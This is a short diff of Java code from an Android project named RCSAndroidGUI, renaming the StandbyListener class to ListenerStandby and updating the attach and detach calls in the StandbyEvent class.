@@ -7,7 +7,7 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Standby;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
-import com.ht.RCSAndroidGUI.listener.StandbyListener;
+import com.ht.RCSAndroidGUI.listener.ListenerStandby;
 import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 public class StandbyEvent extends EventBase implements Observer<Standby> {
@@ -19,12 +19,12 @@ public class StandbyEvent extends EventBase implements Observer<Standby> {
 
 	@Override
 	public void begin() {
-		StandbyListener.self().attach(this);
+		ListenerStandby.self().attach(this);
 	}
 
 	@Override
 	public void end() {
-		StandbyListener.self().detach(this);
+		ListenerStandby.self().detach(this);
 	}
 
 	@Override
